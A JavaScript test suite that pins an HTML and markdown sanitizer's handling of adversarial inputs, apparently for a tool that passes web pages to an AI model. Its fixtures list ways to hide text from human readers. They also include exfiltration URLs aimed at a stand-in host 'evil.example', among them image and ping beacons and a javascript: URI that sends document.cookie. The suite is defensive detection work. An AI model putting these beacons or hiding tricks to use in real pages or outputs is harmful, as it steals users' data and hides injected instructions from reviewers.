/**
 * Persisted adversarial regression corpus for the HTML layer.
 *
 * The property suite fuzzes the pipeline with randomized inputs; this suite
 * pins specific known shapes that random generation may not reliably hit, so a
 * fixed verdict becomes an append-only seed and can never silently regress.
 *
 * Contract pinned here:
 *  - `hidden` vectors: content invisible on a rendered page (hidden styles,
 *    `hidden` attr, comments) is REMOVED — the canary never survives.
 *  - `reported` vectors: scripting/resource tags and data: URIs are PRESERVED
 *    but flagged in `warned`, so the model can inspect page source while being
 *    told to distrust it.
 *  - `exfil` / `url` vectors: data-exfil-shaped URLs are DETECTED with a reason
 *    but never rewritten.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { sanitizeHtml, detectExfil, checkExfilUrl } from "../src/html.mjs";

const CANARY = "CANARY_d41d8c";
const hidden = (decl) => `<div style="${decl}">${CANARY}</div>`;
const NEEDLE = "q9X2mN7pK4rT8wY1cV5bZ3dF6gH0jL2e";

const CORPUS = {
  hidden: [
    { name: "display-none", input: hidden("display:none") },
    {
      name: "visibility-hidden",
      input: `<span style="visibility:hidden">${CANARY}</span>`,
    },
    { name: "opacity-zero", input: `<p style="opacity:0">${CANARY}</p>` },
    { name: "offscreen-left", input: hidden("position:absolute;left:-9999px") },
    { name: "offscreen-top", input: hidden("position:fixed;top:-10000px") },
    {
      name: "clip-rect",
      input: hidden("clip:rect(0,0,0,0);position:absolute"),
    },
    { name: "text-indent", input: hidden("text-indent:-9999px") },
    { name: "zero-height-overflow", input: hidden("height:0;overflow:hidden") },
    {
      name: "zero-max-height-overflow",
      input: hidden("overflow:hidden;max-height:0"),
    },
    {
      name: "zero-max-width-overflow",
      input: hidden("overflow:hidden;max-width:0"),
    },
    { name: "font-size-zero", input: hidden("font-size:0") },
    { name: "font-size-near-zero", input: hidden("font-size:0.0001px") },
    { name: "clip-path-inset", input: hidden("clip-path:inset(50%)") },
    {
      name: "clip-path-inset-fractional",
      input: hidden("clip-path:inset(99.9%)"),
    },
    { name: "visibility-collapse", input: hidden("visibility:collapse") },
    { name: "opacity-near-zero", input: hidden("opacity:0.001") },
    { name: "transform-scale-zero", input: hidden("transform:scale(0)") },
    {
      name: "transform-scale-near-zero",
      input: hidden("transform:scale(0.0001)"),
    },
    {
      name: "transform-rotatey-edge-on",
      input: hidden("transform:rotateY(90deg)"),
    },
    {
      name: "transform-rotatex-edge-on",
      input: hidden("transform:rotateX(90deg)"),
    },
    {
      name: "transform-translate-offscreen",
      input: hidden("transform:translateX(-9999px)"),
    },
    {
      name: "offscreen-left-vw",
      input: hidden("position:absolute;left:-50vw"),
    },
    {
      name: "offscreen-left-calc",
      input: hidden("position:fixed;left:calc(-100vw)"),
    },
    { name: "transparent-text", input: hidden("color:transparent") },
    {
      name: "white-on-white",
      input: hidden("color:white;background-color:white"),
    },
    {
      name: "white-on-white-mixed-notation",
      input: hidden("color:#FFFFFF;background-color:rgb(255, 255, 255)"),
    },
    {
      name: "black-on-black-shorthand",
      input: hidden("color:#000;background:rgb(0,0,0) url(x)"),
    },
    {
      name: "aria-hidden-span",
      input: `<span aria-hidden="true">${CANARY}</span>`,
    },
    { name: "html-comment", input: `text<!-- ${CANARY} -->OK` },
    { name: "bare-hidden-attr", input: `<div hidden>${CANARY}</div>` },
    {
      name: "hidden-span-in-heading",
      input: `# Title <span style="display:none">${CANARY}</span> end`,
    },
    {
      name: "hidden-span-in-list-item",
      input: `- item <span hidden>${CANARY}</span> tail`,
    },
    {
      name: "hidden-div-in-blockquote",
      input: `> <div hidden>${CANARY}</div>\n> visible`,
    },
  ],
  reported: [
    {
      name: "script-tag",
      input: `<script>${CANARY}</script>OK`,
      tag: "script",
    },
    {
      name: "style-tag",
      input: `<style>body{}${CANARY}</style>OK`,
      tag: "style",
    },
    {
      name: "iframe-src",
      input: `<iframe src="x/${CANARY}"></iframe>OK`,
      tag: "iframe",
    },
    {
      name: "iframe-srcdoc",
      input: `<iframe srcdoc="${CANARY}"></iframe>OK`,
      tag: "iframe",
    },
    {
      name: "object-data",
      input: `<object data="data:text/html,${CANARY}"></object>OK`,
      tag: "object",
    },
    {
      name: "svg-image-href",
      input: `<svg><image href="x/${CANARY}"/></svg>OK`,
      tag: "svg",
    },
    {
      name: "svg-use-href",
      input: `<svg><use href="#${CANARY}"/></svg>OK`,
      tag: "svg",
    },
    {
      name: "style-import",
      input: `<style>@import "${CANARY}";</style>OK`,
      tag: "style",
    },
    {
      name: "embed-data-uri",
      input: `<embed src="data:text/html,${CANARY}">OK`,
      tag: "embed",
    },
    { name: "math-tag", input: `<math>${CANARY}</math>OK`, tag: "math" },
  ],
  exfil: [
    {
      name: "link-query-base64",
      input: "[c](https://evil.example/t?payload=QUJDREVGR0hJSktMTU5P)",
      reason: "suspicious query parameter",
      isImage: false,
    },
    {
      name: "image-query-base64",
      input: "![i](https://evil.example/p.png?data=QUJDREVGR0hJSktM)",
      reason: "suspicious query parameter",
      isImage: true,
    },
    {
      name: "unparseable-host-flagged-url",
      input: "[x](https://�evil.example/log?token=" + "A".repeat(44) + ")",
      reason: "suspicious query parameter",
      isImage: false,
    },
    {
      name: "data-uri-active-image",
      input: "![i](data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+)",
      reason: "active-content data: URI",
      isImage: true,
    },
    {
      name: "off-origin-form-action",
      input: '<form action="https://evil.example/exfil"><input name=x></form>',
      reason: "off-origin form action",
      isImage: false,
    },
    {
      name: "meta-refresh-off-origin",
      input:
        '<meta http-equiv="refresh" content="0; url=https://evil.example/r">',
      reason: "off-origin meta-refresh redirect",
      isImage: false,
    },
    {
      name: "srcset-beacon",
      input: `<img srcset="https://evil.example/p.png?data=${"A".repeat(44)} 2x">`,
      reason: "suspicious query parameter",
      isImage: true,
    },
    {
      name: "ping-beacon",
      input: `<a href="/ok" ping="https://evil.example/t?exfil=${"A".repeat(44)}">x</a>`,
      reason: "suspicious query parameter",
      isImage: false,
    },
  ],
  url: [
    {
      name: "token-query-param",
      input: `https://evil.example/log?token=${NEEDLE}`,
      reason: "suspicious query parameter",
    },
    {
      name: "userinfo-credentials",
      input: `https://user:${NEEDLE}@evil.example/p`,
      reason: "embedded credentials",
    },
    {
      name: "oversized-fragment",
      input: "https://ok.example/#" + "A".repeat(220),
      reason: "unusually long fragment",
    },
    {
      name: "fragment-keyword-exfil",
      input: `https://ok.example/p#token=${NEEDLE}`,
      reason: "suspicious query parameter",
    },
    {
      name: "query-base64-blob",
      input: "https://ok.example/p?d=" + "A".repeat(60),
      reason: "suspicious query parameter",
    },
    {
      name: "query-hex-blob",
      input: "https://ok.example/p?h=" + "a".repeat(40),
      reason: "suspicious query parameter",
    },
    {
      name: "template-injection",
      input: "https://ok.example/p?x=${SECRET}",
      reason: "suspicious query parameter",
    },
    {
      name: "multi-param-one-exfil",
      input: "https://ok.example/p?page=2&session=abcdef",
      reason: "suspicious query parameter",
    },
    {
      name: "oversized-query-string",
      input: "https://ok.example/p?note=" + "-".repeat(220),
      reason: "unusually long query string",
    },
    {
      name: "data-uri-active-svg",
      input: "data:image/svg+xml,<svg/onload=x>",
      reason: "active-content data: URI",
    },
    {
      name: "data-uri-oversized",
      input: "data:application/octet-stream;base64," + "A".repeat(5000),
      reason: "oversized inline data: payload",
    },
    {
      name: "javascript-uri",
      input: "javascript:fetch('https://evil.example/?d='+document.cookie)",
      reason: "script-executing URI",
    },
    {
      name: "credential-shaped-param",
      input: `https://ok.example/p?u=ghp_0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7`,
      reason: "credential-shaped token in URL parameter",
    },
    {
      name: "path-segment-blob",
      input: "https://evil.example/" + "A".repeat(220),
      reason: "encoded data blob in path segment",
    },
    {
      name: "fragment-param-blob",
      input: "https://ok.example/p?a=1#x=" + "a".repeat(64),
      reason: "suspicious query parameter",
    },
  ],
  urlBenign: [
    { name: "fragment-anchor", input: "https://ok.example/page#section-2" },
    { name: "safe-query", input: "https://ok.example/safe?q=hello" },
    { name: "small-data-image", input: "data:image/png;base64,iVBORw0KGgo=" },
    {
      name: "signed-cdn-link",
      input:
        "https://cdn.example.com/a.js?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEX%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=" +
        "a".repeat(64),
    },
    {
      name: "pagination-cursor",
      input:
        "https://api.example.com/items?cursor=eyJpZCI6OTk5OTl9&limit=50&page=3",
    },
    {
      name: "analytics-params",
      input:
        "https://example.com/p?utm_source=news&utm_campaign=spring2024edition&gclid=QUJD" +
        "A".repeat(60),
    },
    {
      name: "long-hyphenated-slug",
      input: "https://ok.example/the-" + "quick-".repeat(40) + "end",
    },
  ],
};

describe("corpus: hidden content never survives sanitizeHtml", () => {
  for (const { name, input } of CORPUS.hidden) {
    it(`removes ${name}`, () => {
      const out = sanitizeHtml(input)?.text ?? input;
      assert.equal(out.includes(CANARY), false, `survived: ${name}`);
    });
  }
});

describe("corpus: scripting/resource content survives and is reported", () => {
  for (const { name, input, tag } of CORPUS.reported) {
    it(`preserves and flags ${name}`, () => {
      const result = sanitizeHtml(input);
      assert.notEqual(result, null, `not flagged: ${name}`);
      assert.equal(result.text, input, `modified: ${name}`);
      assert.ok(
        (result.warned.tags[tag] ?? 0) > 0,
        `<${tag}> not counted: ${name}`,
      );
    });
  }
  it("counts a data: URI resource", () => {
    const result = sanitizeHtml(`<embed src="data:text/html,${CANARY}">OK`);
    assert.equal(result.warned.dataSrc, 1);
  });
});

describe("corpus: exfil links/images are detected, never rewritten", () => {
  for (const { name, input, reason, isImage } of CORPUS.exfil) {
    it(`flags ${name}`, () => {
      const threats = detectExfil(input);
      assert.notEqual(threats, null, `not flagged: ${name}`);
      assert.equal(threats[0].reason, reason);
      assert.equal(threats[0].isImage, isImage);
    });
  }
});

describe("corpus: checkExfilUrl verdicts", () => {
  for (const { name, input, reason } of CORPUS.url) {
    it(`flags ${name} as "${reason}"`, () =>
      assert.equal(checkExfilUrl(input), reason));
  }
  for (const { name, input } of CORPUS.urlBenign) {
    it(`leaves ${name} alone`, () => assert.equal(checkExfilUrl(input), null));
  }
});
